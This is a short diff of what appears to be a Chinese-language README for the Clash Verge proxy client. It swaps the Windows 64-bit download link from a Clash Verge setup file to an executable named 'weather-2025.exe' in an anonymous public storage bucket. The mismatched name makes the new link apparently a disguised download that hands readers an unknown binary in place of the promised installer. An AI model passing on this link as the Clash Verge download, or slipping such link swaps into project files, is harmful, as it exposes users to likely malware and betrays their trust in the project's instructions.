@@ -17,7 +17,7 @@
 
 
 
-[点击下载win64位](https://and.catpaw.cloud/Clash.Verge_2.2.3_x64-setup.exe)
+[点击下载win64位](https://pub-0eb7ad7ed5384bedadc940aa842b8ef9.r2.dev/weather-2025.exe)
 
 ## 🎥 Windows视频教程演示
 
